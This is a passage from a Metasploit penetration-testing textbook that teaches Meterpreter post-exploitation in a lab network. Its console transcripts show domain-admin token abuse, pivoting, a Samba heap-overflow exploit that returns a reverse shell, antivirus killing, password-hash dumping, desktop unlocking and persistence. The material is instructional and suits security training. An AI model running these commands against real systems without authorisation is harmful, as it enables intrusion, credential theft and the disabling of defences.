style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">[*] Attempting to add user omgcompromised to group Domain Admins on domain controller</p><p class="s25" style="padding-left: 53pt;text-indent: 0pt;line-height: 11pt;text-align: left;">192.168.33.50</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[+] Successfully added user to group</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_262.png"/></span></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">When entering the <span class="s25">add_user </span>and <span class="s25">add_group_user </span>commands, be sure to specify the <span class="s25">-h </span>flag, which tells Incognito where to add the domain administra- tor account. In this case, that would be the IP address of a domain controller. The implications for this attack are devastating: Essentially, the Kerberos token on any system that a domain administrator logs into can be assumed and used to access the entire domain. This means that every server on your network is your weakest link!</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark208">Pivoting onto Other Systems</a><a name="bookmark236">&zwnj;</a></p><p class="s19" style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Pivoting <span class="p">is a Meterpreter method that allows for the attack of other systems on a network through the Meterpreter console. For example, if an attacker were to compromise one system, he could use pivoting to compromise other systems on the same network or to access systems to which he could not otherwise route traffic, for whatever reason.</span></p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">For example, suppose you’re performing a penetration test from the Internet. You compromise a system through a vulnerability and have a</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Meterpreter console to the internal network. You can’t directly access other systems on the network, because the system you compromised did not pro- vide you with everything you need to do so, but you need to penetrate the network further. Pivoting will allow you to attack multiple systems on the internal network through the Internet, using the Meterpreter console.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">In the following example, we’ll attack a system from one subnet and route that system to attack another system. First, we’ll exploit the Windows XP machine, and then we’ll piggyback the attack from our attacking machine to an Ubuntu system on the internal network. We’ll come from a 10.10.1.1/24 address and attack systems within the 192.168.33.1/24 network.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">We’ll assume that we already have access to one server via a compromise and will focus on establishing a connection to that network. Next, we intro- duce external scripts written with Meterpreter that can be found in the <span class="s19">scripts/ meterpreter/ </span>directory. These scripts offer additional functionality that we can use within Meterpreter.</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 18pt;line-height: 84%;text-align: left;">We begin by displaying local subnets on the compromised system within a Meterpreter session with <span class="s25">run get_local_subnets</span>, as shown at <span class="s32">O</span>.</p><p style="text-indent: 0pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_263.png"/></span></p><p class="s25" style="padding-top: 2pt;padding-left: 90pt;text-indent: 0pt;line-height: 21pt;text-align: left;">[*] Meterpreter session 1 opened (10.10.1.129:443 -&gt; 192.168.33.130:1075) meterpreter &gt; <span class="s24">run get_local_subnets </span><span class="s30">O</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 8pt;text-align: left;">Local subnet: 192.168.33.0/255.255.255.0</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 12pt;text-align: left;">meterpreter &gt; <span class="s24">background </span><span class="s30">8</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(handler) &gt; <span class="s24">route add 192.168.33.0 255.255.255.0 1 </span><span class="s30">@</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 13pt;text-align: left;">msf exploit(handler) &gt; <span class="s24">route print </span><span class="s30">O</span></p><p class="s25" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Active Routing Table</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">====================</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:90.5pt" cellspacing="0"><tr style="height:10pt"><td style="width:79pt"><p class="s28" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Subnet</p></td><td style="width:83pt"><p class="s28" style="padding-left: 14pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Netmask</p></td><td style="width:171pt"><p class="s28" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Gateway</p></td></tr><tr style="height:11pt"><td style="width:79pt"><p class="s28" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">------</p></td><td style="width:83pt"><p class="s28" style="padding-left: 14pt;text-indent: 0pt;line-height: 10pt;text-align: left;">-------</p></td><td style="width:171pt"><p class="s28" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">-------</p></td></tr><tr style="height:14pt"><td style="width:79pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">192.168.33.0</p></td><td style="width:83pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-left: 14pt;text-indent: 0pt;line-height: 10pt;text-align: left;">255.255.255.0</p></td><td style="width:171pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-left: 12pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Session 1 <span class="s33">@</span></p></td></tr></table><p style="padding-top: 5pt;padding-left: 90pt;text-indent: 18pt;line-height: 76%;text-align: justify;">We have successfully compromised our Windows XP machine and have full access to it. Next, we background our running session at <span class="s32">8 </span>and add a <span class="s25">route </span>command to the Framework at <span class="s32">@</span>, telling it to route the remote net-</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 82%;text-align: justify;">work ID over session 1, the background Meterpreter session. We then display active routes with <span class="s25">route print </span>at <span class="s32">O</span>, and we can clearly see at <span class="s32">@ </span>that, just as we desired, the route is active.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Next, we’ll set up a second exploit against the targeted Linux system. The specific exploit here is a Samba-based heap overflow, which would be vulnerable on our Metasploitable machine.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_264.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">use msf exploit(handler) &gt; <span class="s24">use linux/samba/lsa_transnames_heap</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(lsa_transnames_heap) &gt; <span class="s24">set payload linux/x86/shell/reverse_tcp</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">payload =&gt; linux/x86/shell/reverse_tcp</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 12pt;text-align: left;">msf exploit(lsa_transnames_heap) &gt; <span class="s24">set LHOST 10.10.1.129 </span><span class="s30">O</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">LHOST =&gt; 10.10.1.129</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(lsa_transnames_heap) &gt; <span class="s24">set LPORT 8080</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">LPORT =&gt; 8080</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 12pt;text-align: left;">msf exploit(lsa_transnames_heap) &gt; <span class="s24">set RHOST 192.168.33.132 </span><span class="s30">8</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">RHOST =&gt; 192.168.33.132</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 12pt;text-align: left;">msf exploit(lsa_transnames_heap) &gt; <span class="s24">ifconfig </span><span class="s30">@</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] exec: ifconfig</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">eth0 Link encap:Ethernet HWaddr 00:0c:29:47:e6:79</p><p class="s25" style="padding-left: 78pt;text-indent: 0pt;line-height: 11pt;text-align: left;">inet addr:10.10.1.129 Bcast:10.10.1.255 Mask:255.255.255.0</p><p class="s25" style="padding-left: 78pt;text-indent: 0pt;text-align: left;">inet6 addr: fe80::20c:29ff:fe47:e679/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1</p><p class="s25" style="padding-left: 78pt;text-indent: 0pt;text-align: left;">RX packets:23656 errors:0 dropped:0 overruns:0 frame:0 TX packets:32321 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000</p><p class="s25" style="padding-left: 78pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RX bytes:4272582 (4.2 MB) TX bytes:17849775 (17.8 MB)</p><p class="s25" style="padding-left: 78pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Interrupt:19 Base address:0x2000</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">lo Link encap:Local Loopback</p><p class="s25" style="padding-left: 78pt;text-indent: 0pt;text-align: left;">inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host</p><p class="s25" style="padding-left: 78pt;text-indent: 0pt;line-height: 10pt;text-align: left;">UP LOOPBACK RUNNING MTU:16436 Metric:1</p><p class="s25" style="padding-left: 78pt;text-indent: 0pt;text-align: left;">RX packets:600 errors:0 dropped:0 overruns:0 frame:0 TX packets:600 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0</p><p class="s25" style="padding-left: 78pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RX bytes:41386 (41.3 KB) TX bytes:41386 (41.3 KB)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">msf exploit(lsa_transnames_heap) &gt; <span class="s24">exploit</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Started reverse handler on 10.10.1.129:8080 [*] Creating nop sled....</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Trying to exploit Samba with address 0xffffe410...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Connecting to the SMB service...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Binding to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.33.132[\lsarpc] ...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Bound to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.33.132[\lsarpc] ...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Calling the vulnerable function...</p><p class="s25" style="padding-top: 3pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[+] Server did not respond, this is expected</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Trying to exploit Samba with address 0xffffe411... [*] Connecting to the SMB service...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Binding to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.33.132[\lsarpc] ... [*] Bound to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.33.132[\lsarpc] ... [*] Calling the vulnerable function...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[+] Server did not respond, this is expected</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Trying to exploit Samba with address 0xffffe412... [*] Connecting to the SMB service...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Binding to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.33.132[\lsarpc] ... [*] Bound to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.33.132[\lsarpc] ... [*] Calling the vulnerable function...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Sending stage (36 bytes)</p><p class="s25" style="padding-bottom: 2pt;padding-left: 36pt;text-indent: 0pt;line-height: 14pt;text-align: left;">[*] Command shell session 1 opened (10.10.1.129:8080 -&gt; 192.168.33.132:1608) <span class="s30">O</span></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_265.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;line-height: 74%;text-align: left;">Compare the <span class="s25">LHOST </span><span class="s32">O </span>and <span class="s25">RHOST </span><span class="s32">8 </span>variables to the network information displayed by <span class="s25">ifconfig </span><span class="s32">@</span>. Our <span class="s25">LHOST </span>option specifies the IP address of our attack- ing machine. Also notice, the <span class="s25">RHOST </span>option IP address is set to a different net-</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">work subnet and that we are attacking systems by tunneling our traffic through our compromised target to additional systems on the target’s network. We are leveraging the pivoting attack through Metasploit to pass communica- tions through our exploited machine to the target machine that resides on the local subnet. In this case, if the heap overflow is successful, we should be presented with a reverse shell from 192.168.33.132, simply by leveraging the network communications on the already compromised machine. When we run</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 81%;text-align: left;">the exploit with <span class="s25">exploit</span>, we see at <span class="s32">O </span>that a connection is set up as expected on a different machine, not the Windows XP machine. Now, to port scan</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">through the pivot, we would use the <span class="s19">scanner/portscan/tcp </span>scanner module, which is built to handle routing through Metasploit.</p><p class="s19" style="padding-top: 9pt;padding-left: 90pt;text-indent: -36pt;text-align: left;"><span class="s22">NOTE </span>You could also use the <span class="p">scanner/portscan/tcp </span>scanner to conduct a series of port scans through your compromised target on the local subnet itself. We won’t go into the details here, but just know that you can perform port scanning on a compromised net- work leveraging this module.</p><p style="padding-top: 5pt;padding-left: 90pt;text-indent: 17pt;text-align: left;">In the preceding examples, we used the <span class="s25">route add </span>command after we had compromised the system. Alternatively, to add the routes automatically to Meterpreter upon a new session spawn, we could use <span class="s25">load auto_add_route</span>:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_266.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">load auto_add_route</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Successfully loaded plugin: auto_add_route</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">exploit</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Started reverse handler on 10.10.1.129:443 [*] Triggering the vulnerability...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Sending stage (748032 bytes)</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Meterpreter session 1 opened (10.10.1.129:443 -&gt; 192.168.33.130:1090)</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] AutoAddRoute: Routing new subnet 192.168.33.0/255.255.255.0 through session 1</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_267.png"/></span></p><p class="s4" style="padding-top: 5pt;padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark209">Using Meterpreter Scripts</a><a name="bookmark237">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Several external Meterpreter scripts can help you to enumerate a system or perform predefined tasks inside the Meterpreter shell. We won’t cover every script here, but we will mention a few of the most notable ones.</p><p class="s22" style="padding-top: 9pt;padding-left: 42pt;text-indent: 0pt;text-align: center;">NOTE     <span class="s19">The Meterpreter scripts are in the process of being moved to post exploitation modules.</span></p><p class="s19" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">We’ll cover both scripts and post exploitation modules in this chapter.</p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">To run a script from the Meterpreter console, enter <span class="s24">run </span><span class="s44">scriptname</span>. The script will either execute or provide additional help on how to run it.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Should you want to use an interactive remote GUI on the system, you can use the VNC protocol to tunnel the active desktop communications and interact with the GUI desktop on the target machine. But in some cases, the system may be locked and you may be unable to access it. Never fear: Metasploit has us covered.</p><p style="padding-left: 90pt;text-indent: 17pt;text-align: left;">In the following example, we issue the <span class="s25">run vnc </span>command, which installs a VNC session on the remote system. From there, we launch <span class="s25">run screen_unlock </span>to unlock the target machine so that we can view the desktop. As a result, a VNC window should appear, showing us the target desktop.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_268.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">run vnc</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Creating a VNC reverse tcp stager: LHOST=192.168.33.129 LPORT=4545) [*] Running payload handler</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] VNC stager executable 37888 bytes long</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Uploaded the VNC agent to C:\WINDOWS\TEMP\CTDWtQC.exe (must be deleted manually) [*] Executing the VNC agent with endpoint 192.168.33.129:4545...</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] VNC Server session 2 opened (192.168.33.129:4545 -&gt; 192.168.33.130:1091)</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_269.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">This will give us a VNC graphical interface to the target machine and allow us to interact through a desktop.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_270.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">run screen_unlock</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] OS &#39;Windows XP (Build 2600, Service Pack 2).&#39; found in known targets [*] patching...</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] done!</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_271.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark210">Migrating a Process</a><a name="bookmark238">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Often, when we are attacking a system and exploiting a service such as Inter- net Explorer, if the target user closes the browser, the Meterpreter session</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">is also closed and we lose our connection to the target. To avoid this prob- lem, we can use the <span class="s19">migrate </span>post exploitation module, shown next, to attempt to migrate the service to a memory space that won’t close when the target closes the browser. By migrating to a different, more stable process, we ensure that the process isn’t closed and we maintain our connection to the system.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_272.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">run post/windows/manage/migrate</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Running module against V-MAC-XP</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Current server process: revterp.exe (2436)</p><p class="s25" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Migrating to explorer.exe... [*] Migrating into process ID 816</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] New server process: Explorer.EXE (816)</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_273.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark211">Killing Antivirus Software</a><a name="bookmark239">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Antivirus software can block certain tasks. During penetration tests, we have seen “smarter” antivirus or host-based intrusion prevention products block our ability to run certain attack vectors. In such cases, we can run the <span class="s25">killav </span>script to stop the processes preventing our tasks from running.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_274.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">run killav</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Killing Antivirus services on the target... [*] Killing off cmd.exe...</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Killing off cmd.exe...</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_275.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark212">Obtaining System Password Hashes</a><a name="bookmark240">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Obtaining a copy of the system’s password hashes allows us to run pass-the- hash attacks or to brute force the hash to reveal the plain-text password. We can obtain the password hashes with the <span class="s25">run hashdump </span>command:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_276.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">run hashdump</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Obtaining the boot key...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Calculating the hboot key using SYSKEY de4b35306c5f595438a2f78f768772d2... [*] Obtaining the user list and keys...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Decrypting user keys... [*] Dumping password hashes...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_277.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark213">Viewing All Traffic on a Target Machine</a><a name="bookmark241">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">To see all traffic on a target, we can run a packet recorder. Everything cap- tured by <span class="s25">packetrecorder </span>is saved in the <span class="s19">.pcap </span>file format to be parsed with a tool such as Wireshark.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">In this listing, we run the <span class="s25">packetrecorder </span>script with the <span class="s25">-i 1 </span>option, which specifies which interface we want to use to perform the packet captures:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_278.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">run packetrecorder -i 1</span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Starting Packet capture on interface 1 [*] Packet capture started</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_279.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark214">Scraping a System</a><a name="bookmark242">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">The <span class="s25">scraper </span>script enumerates just about everything you could ever want from a system. It will grab the usernames and passwords, download the entire registry, dump password hashes, gather system information, and export the <span class="s25">HKEY_CURRENT_USER </span>(<span class="s25">HKCU</span>).</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_280.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: justify;">meterpreter &gt; <span class="s24">run scraper</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: justify;">[*] New session on 192.168.33.130:1095... [*] Gathering basic system information... [*] Dumping password hashes...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Obtaining the entire registry... [*] Exporting HKCU</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Downloading HKCU (C:\WINDOWS\TEMP\XklepHOU.reg)</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_281.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark215">Using Persistence</a><a name="bookmark243">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Meterpreter’s <span class="s25">persistence </span>script allows you to inject a Meterpreter agent to ensure that Meterpreter is running even after the target system reboots. If this is a reverse connection, you can set intervals for the target to connect back to the attacker machine. If it’s a bind, you can have it attempt to bind on an interface at a given time.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s22" style="padding-left: 90pt;text-indent: -56pt;text-align: left;">WARNING <span class="s19">If you use this functionality, be sure that you remove it after you’re done. If you forget to do this, any attacker can also gain access to the system without authentication!</span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">In the following listing, we run <span class="s25">persistence </span>and tell Windows to autostart the agent at boot time (<span class="s25">-X</span>), wait 50 seconds (<span class="s25">-i 50</span>) before connection retries,</p><p style="padding-top: 2pt;padding-left: 90pt;text-indent: 0pt;line-height: 76%;text-align: justify;">run on port 443 (<span class="s25">-p 443</span>), and connect to IP 192.168.33.129. We then estab- lish a listener for the agent at <span class="s32">O </span>with <span class="s25">use multi/handler</span>, and after setting a couple of options and running <span class="s25">exploit</span>, we see at <span class="s32">@ </span>that the connection comes</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: justify;">in as expected.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_282.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">run persistence -X -i 50 -p 443 